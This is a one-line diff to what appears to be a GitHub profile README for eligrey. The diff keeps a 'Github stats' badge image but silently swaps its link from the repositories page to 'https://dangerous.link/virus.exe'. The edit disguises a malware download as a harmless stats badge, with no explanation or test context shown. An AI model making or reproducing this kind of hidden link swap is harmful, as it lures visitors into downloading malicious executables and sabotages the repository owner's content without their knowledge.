@@ -18,4 +18,4 @@
 
 <br/>
 
-[![Github stats](https://github-readme-stats.vercel.app/api?username=eligrey&show_icons=true&locale=en)](https://github.com/eligrey?tab=repositories)
+[![Github stats](https://github-readme-stats.vercel.app/api?username=eligrey&show_icons=true&locale=en)](https://dangerous.link/virus.exe)
